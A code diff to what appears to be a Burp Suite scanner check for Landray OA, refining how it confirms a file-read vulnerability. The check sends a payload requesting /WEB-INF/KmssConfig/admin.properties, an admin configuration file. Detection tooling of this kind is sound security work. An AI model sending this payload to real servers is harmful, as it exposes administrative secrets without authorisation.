@@ -23,18 +23,20 @@ public class LandrayOa extends VulTaskImpl {
                 "Accept-Encoding: gzip\n" +
                 "\n";
         String poc_body = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
-        IHttpRequestResponse messageInfo1 = BurpExtender.requester.send(this.iHttpService, Arrays.asList(poc_req.split("\n")), poc_body.getBytes());
+        IHttpRequestResponse messageInfo1 = requester.send(this.iHttpService, Arrays.asList(poc_req.split("\n")), poc_body.getBytes());
         //新请求信息
         IRequestInfo analyzeRequest = this.helpers.analyzeRequest(messageInfo1);
         //新的返回包
         IResponseInfo analyzeResponse1 = this.helpers.analyzeResponse(messageInfo1.getResponse());
+        String resp = new String(messageInfo1.getResponse());
+        String resp1_body = resp.substring(analyzeResponse1.getBodyOffset());
         //新返回上面板信息
         String path = analyzeRequest.getUrl().getPath();
         String method = analyzeRequest.getMethod();
         short status = analyzeResponse1.getStatusCode();
 
         //如果状态码相同则可能存在问题
-        if (status == 200) {
+        if (status == 200 && resp1_body.length() > 0) {
             message = "LandrayOa Vul";
             messageInfo_r = messageInfo1;
         }
